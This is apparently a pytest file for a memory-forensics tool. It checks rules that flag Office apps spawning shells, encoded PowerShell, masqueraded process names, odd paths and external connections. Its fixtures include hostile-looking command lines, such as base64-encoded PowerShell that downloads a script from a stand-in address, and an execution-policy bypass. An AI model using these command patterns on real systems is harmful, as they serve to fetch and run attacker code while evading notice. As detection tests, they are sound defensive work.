"""Task 4.2: one fixture per rule of rules/process_rules.yaml, plus the PowerShell decoder."""
import base64
from pathlib import Path

from forensic_mcp import analyzers, decode

SHA = "b" * 64


def _rows(*rows):
    return [{"_row": i, **r} for i, r in enumerate(rows, 1)]


def _run(tmp: Path, plugin: str, *rows):
    return analyzers.analyze(tmp, SHA, plugin, _rows(*rows))


def _ids(res):
    return sorted(a["rule_id"] for a in res["anomalies"])


def _enc(text: str) -> str:
    return base64.b64encode(text.encode("utf-16-le")).decode()


def test_rule_table_has_the_seven_rules_with_attack_ids() -> None:
    ids = {r["id"] for r in analyzers.rules()["rules"]}
    assert {"office_spawns_shell", "encoded_powershell", "system_process_wrong_parent",
            "duplicate_singleton", "masquerade_name", "unusual_path",
            "external_connection"} <= ids
    for r in analyzers.rules()["rules"]:
        assert all(t.startswith("T1") for t in r["attack"])


def test_office_spawns_shell(tmp_path: Path) -> None:
    res = _run(tmp_path, "windows.pslist.PsList",
               {"PID": 2980, "PPID": 500, "ImageFileName": "EXCEL.EXE"},
               {"PID": 4312, "PPID": 2980, "ImageFileName": "cmd.exe"},
               {"PID": 700, "PPID": 500, "ImageFileName": "powershell.exe"})
    assert _ids(res) == ["office_spawns_shell"] and res["anomalies"][0]["rows"] == [2]


def test_encoded_powershell_any_prefix(tmp_path: Path) -> None:
    blob = _enc("Write-Host hello 198.51.100.7")
    for flag in ("-e", "-EncodedCommand", "/enc", "-ec", "-ENCODEDC"):
        res = _run(tmp_path, "windows.cmdline.CmdLine",
                   {"PID": 1, "Process": "powershell.exe", "Args": f"powershell {flag} {blob}"})
        assert _ids(res) == ["encoded_powershell"], flag
        assert res["decoded"][0]["text"] == "Write-Host hello 198.51.100.7"
        assert {"type": "ip", "value": "198.51.100.7", "_row": 1, "source": "decoded"} in res["iocs"]
    neg = _run(tmp_path, "windows.cmdline.CmdLine",
               {"PID": 2, "Process": "powershell.exe", "Args": "powershell -ep bypass -f a.ps1"})
    assert neg["anomalies"] == [] and neg["decoded"] == []


def test_decoder_two_layers_max() -> None:
    inner = _enc("Invoke-WebRequest http://example.test/x")
    two = decode.decode_powershell(f"powershell -enc {_enc('powershell -enc ' + inner)}")
    assert two == {"layers": 2, "text": "Invoke-WebRequest http://example.test/x"}
    three = decode.decode_powershell(
        f"powershell -enc {_enc('powershell -enc ' + _enc('powershell -enc ' + inner))}")
    assert three["layers"] == 2 and three["text"].startswith("powershell -enc")
    assert decode.decode_powershell("powershell -enc notbase64!") is None


def test_system_process_wrong_parent(tmp_path: Path) -> None:
    res = _run(tmp_path, "windows.pslist.PsList",
               {"PID": 500, "PPID": 1, "ImageFileName": "explorer.exe"},
               {"PID": 480, "PPID": 400, "ImageFileName": "services.exe"},
               {"PID": 600, "PPID": 500, "ImageFileName": "svchost.exe"},
               {"PID": 601, "PPID": 480, "ImageFileName": "svchost.exe"})
    a = [x for x in res["anomalies"] if x["rule_id"] == "system_process_wrong_parent"]
    assert len(a) == 1 and a[0]["rows"] == [3] and a[0]["attack"] == ["T1036"]


def test_duplicate_singleton(tmp_path: Path) -> None:
    res = _run(tmp_path, "windows.pslist.PsList",
               {"PID": 490, "PPID": 400, "ImageFileName": "lsass.exe", "ExitTime": None},
               {"PID": 5100, "PPID": 400, "ImageFileName": "lsass.exe", "ExitTime": None},
               {"PID": 5200, "PPID": 400, "ImageFileName": "wininit.exe", "ExitTime": None},
               {"PID": 5201, "PPID": 400, "ImageFileName": "wininit.exe",
                "ExitTime": "2026-10-06 10:00:00"})
    a = [x for x in res["anomalies"] if x["rule_id"] == "duplicate_singleton"]
    assert len(a) == 1 and a[0]["rows"] == [1, 2]  # the exited wininit does not count


def test_masquerade_name(tmp_path: Path) -> None:
    res = _run(tmp_path, "windows.pslist.PsList",
               {"PID": 1, "PPID": 0, "ImageFileName": "svch0st.exe"},
               {"PID": 2, "PPID": 0, "ImageFileName": "svchost.exe"},
               {"PID": 3, "PPID": 0, "ImageFileName": "notepad.exe"})
    a = [x for x in res["anomalies"] if x["rule_id"] == "masquerade_name"]
    assert len(a) == 1 and a[0]["rows"] == [1] and a[0]["attack"] == ["T1036.005"]


def test_unusual_path(tmp_path: Path) -> None:
    res = _run(tmp_path, "windows.cmdline.CmdLine",
               {"PID": 1, "Process": "svchost.exe", "Args": "C:\\Users\\Public\\svchost.exe -k x"},
               {"PID": 2, "Process": "x.exe",
                "Args": '"C:\\Users\\bob\\AppData\\Local\\Temp\\x.exe" /q'},
               {"PID": 3, "Process": "svchost.exe",
                "Args": "C:\\Windows\\System32\\svchost.exe -k netsvcs"})
    a = {x["rows"][0]: x for x in res["anomalies"] if x["rule_id"] == "unusual_path"}
    assert set(a) == {1, 2}
    assert a[1]["attack"] == ["T1036.005"] and a[2]["attack"] == []


def test_false_positives_seen_on_the_real_sample(tmp_path: Path) -> None:
    res = _run(tmp_path, "windows.cmdline.CmdLine",
               {"PID": 1008, "Process": "conhost.exe",
                "Args": "\\??\\C:\\Windows\\system32\\conhost.exe"},
               {"PID": 3576, "Process": "iexplore.exe",
                "Args": '"C:\\Program Files\\Internet Explorer\\iexplore.exe"'})
    assert res["anomalies"] == []


def test_external_connection(tmp_path: Path) -> None:
    rows = ({"PID": 9, "Owner": "x.exe", "ForeignAddr": "203.0.113.10", "ForeignPort": 443,
             "State": "ESTABLISHED"},
            {"PID": 9, "Owner": "x.exe", "ForeignAddr": "10.0.0.5", "ForeignPort": 445,
             "State": "ESTABLISHED"},
            {"PID": 9, "Owner": "x.exe", "ForeignAddr": "198.51.100.1", "ForeignPort": 80,
             "State": "CLOSED"})
    res = _run(tmp_path, "windows.netscan.NetScan", *rows)
    assert _ids(res) == ["external_connection"] and res["anomalies"][0]["rows"] == [1]
    assert res["anomalies"][0]["severity"] == "medium"
    vol2 = _run(tmp_path, "netscan", {"Pid": 9, "Owner": "x.exe",
                                      "Foreign Address": "203.0.113.10:443",
                                      "State": "ESTABLISHED"})
    assert _ids(vol2) == ["external_connection"]


def test_ioc_match_and_severity_raised_by_other_rule(tmp_path: Path) -> None:
    _run(tmp_path, "windows.pslist.PsList",
         {"PID": 2980, "PPID": 1, "ImageFileName": "WINWORD.EXE"},
         {"PID": 4312, "PPID": 2980, "ImageFileName": "powershell.exe"})
    _run(tmp_path, "windows.cmdline.CmdLine",
         {"PID": 4312, "Process": "powershell.exe",
          "Args": f"powershell -enc {_enc('iwr http://203.0.113.10/a.ps1')}"})
    res = _run(tmp_path, "windows.netscan.NetScan",
               {"PID": 4312, "Owner": "powershell.exe", "ForeignAddr": "203.0.113.10",
                "ForeignPort": 443, "State": "ESTABLISHED"})
    by = {a["rule_id"]: a for a in res["anomalies"]}
    assert by["ioc_match"]["rows"] == [1] and by["external_connection"]["severity"] == "high"
